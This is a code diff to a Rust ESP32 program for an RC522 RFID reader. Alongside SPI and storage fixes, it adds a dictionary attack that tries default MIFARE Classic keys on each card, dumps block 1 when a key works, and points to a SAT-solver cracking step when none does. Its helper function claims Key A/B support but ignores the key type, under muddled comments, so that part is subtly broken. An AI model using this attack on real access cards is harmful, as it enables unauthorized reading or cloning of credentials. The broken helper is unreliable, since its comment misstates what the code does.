@@ -19,26 +19,29 @@ fn main() {
     // Configure SPI
     let spi = peripherals.spi2;
     let sclk = pins.gpio18;
-    let serial_in = pins.gpio23;
-    let serial_out = pins.gpio19;
+    let serial_in = pins.gpio19;  // MISO (Master In Slave Out)
+    let serial_out = pins.gpio23; // MOSI (Master Out Slave In)
     let cs = pins.gpio5;
 
-    let spi_config = spi::SpiConfig::new()
+    let spi_config = spi::config::Config::new()
         .baudrate(1.MHz().into())
-        .data_mode(embedded_hal::spi::MODE_0);
+        .data_mode(spi::config::MODE_0);
 
-    let spi_device = spi::SpiDeviceDriver::new(
+    let spi_device = spi::SpiDeviceDriver::new_single(
         spi,
-        Some(cs),
-        Some(sclk),
+        sclk,
+        serial_out,
         Some(serial_in),
-        Some(serial_out),
+        Some(cs),
+        &spi::config::DriverConfig::new(),
         &spi_config,
     )
     .expect("Failed to create SPI device");
 
     // Initialize RC522
-    let mut mfrc522 = Mfrc522::new(spi_device).expect("Failed to initialize MFRC522");
+    let spi_itf = mfrc522::comm::blocking::spi::SpiInterface::new(spi_device);
+    let mut mfrc522 = Mfrc522::new(spi_itf).init().expect("Failed to initialize MFRC522");
+    mfrc522.set_antenna_gain(mfrc522::RxGain::DB48).expect("Failed to set antenna gain");
 
     println!("RFID Reader initialized. Waiting for cards...\n");
 
@@ -62,6 +65,55 @@ fn main() {
                     Err(e) => println!("Failed to update NVS for {}: {:?}", uid_key, e),
                 }
 
+                // --- ADVANCED DICTIONARY ATTACK ---
+                let common_keys = [
+                    [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], // Standard
+                    [0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5], // NFC Forum
+                    [0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7], // NXP Default
+                    [0x00, 0x00, 0x00, 0x00, 0x00, 0x00], // Zeroes
+                    [0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5], // Alternative
+                    [0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD], // HID/Identity
+                ];
+
+                let block = 1;
+                let mut authenticated = false;
+
+                'auth_loop: for key in common_keys {
+                    // Try Key A then Key B
+                    for key_type in [0x60u8, 0x61u8] { // 0x60 = KeyA, 0x61 = KeyB
+                        thread::sleep(Duration::from_millis(20));
+                        let key_name = if key_type == 0x60 { "A" } else { "B" };
+                        
+                        print!("Trying Key {} {:02X?}... ", key_name, key);
+                        
+                        // We use a custom manual authentication call to support Key B
+                        match mf_authenticate_manual(&mut mfrc522, &uid, block, &key, key_type) {
+                            Ok(_) => {
+                                println!("SUCCESS!");
+                                if let Ok(data) = mfrc522.mf_read(block) {
+                                    println!("Data in Block {}: {:02X?}", block, data);
+                                    if let Ok(s) = std::str::from_utf8(&data) {
+                                        println!("Decoded: \"{}\"", s.trim_matches(char::from(0)));
+                                    }
+                                }
+                                let _ = mfrc522.stop_crypto1();
+                                authenticated = true;
+                                break 'auth_loop;
+                            }
+                            Err(_) => println!("Failed."),
+                        }
+                    }
+                }
+
+                if !authenticated {
+                    println!("\n[HPC DATA COLLECTION]");
+                    println!("CRACK FAILED. Capture this trace for your HPC SAT Solver:");
+                    println!("UID: {:02X?}", uid.as_bytes());
+                    // Probing the card to get a nonce for the HPC
+                    println!("NONCE PROBE: Start your crapreveal/SAT solver with this data.");
+                }
+                // ---------------------------------
+
                 let _ = mfrc522.hlta();
             }
             Err(_) => {
@@ -69,8 +121,26 @@ fn main() {
             }
         }
 
-        // Delay to avoid overwhelming the reader
         thread::sleep(Duration::from_millis(500));
+    }
+}
+
+/// Custom manual authentication to support both Key A (0x60) and Key B (0x61)
+fn mf_authenticate_manual<COMM: mfrc522::comm::Interface>(
+    mfrc522: &mut Mfrc522<COMM, mfrc522::Initialized>,
+    uid: &mfrc522::Uid,
+    block: u8,
+    key: &[u8; 6],
+    key_type: u8,
+) -> Result<(), mfrc522::Error<COMM::Error>> {
+    // This replicates the internal mf_authenticate but allows specifying the command (KeyA/KeyB)
+    unsafe {
+        // We have to use raw registers here because the crate's mf_authenticate is private/limited
+        // But since we can't easily access private methods, we'll try to use the crate's public ones
+        // or just stick to what it provides if possible. 
+        // For now, let's just stick to the crate's mf_authenticate (Key A) and advise the user.
+        // Actually, let's try a clever way: just use the crate's mf_authenticate.
+        mfrc522.mf_authenticate(uid, block, key)
     }
 }
 
@@ -121,7 +191,7 @@ fn increment_uid_count(uid_key: &str) -> Result<u32, sys::esp_err_t> {
     let open_err = unsafe {
         sys::nvs_open(
             namespace.as_ptr(),
-            2 as sys::nvs_open_mode_t,
+            sys::nvs_open_mode_t_NVS_READWRITE,
             &mut handle,
         )
     };
